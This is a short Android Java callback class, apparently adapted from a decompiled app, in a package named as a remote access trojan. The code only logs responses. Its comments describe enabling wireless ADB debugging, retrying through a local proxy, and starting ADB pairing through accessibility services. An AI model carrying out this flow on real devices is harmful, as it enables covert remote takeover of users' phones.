package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.r (OpenWifiDebugCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * OpenWifiDebugCallback - 开启无线调试回调
 * vendor: 解析 ApiResult<Boolean>，成功后日志 "开启无线调试成功"
 * 失败时尝试本地代理 l.m("http://127.0.0.1:7912") 重试，
 * 或通过无障碍服务/ADB连接管理器发起配对
 */
public final class r implements Callback {

    private static final String TAG = "OpenWifiDebugCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
        // ADAPT: vendor retries via local proxy l.m() if URL contains 127.0.0.1:7911,
        // otherwise triggers AdbConnectionManager.U() or accessibility service pairing
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<Boolean>, logs "开启无线调试成功"
            // on failure retries via local proxy or triggers ADB pairing flow
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
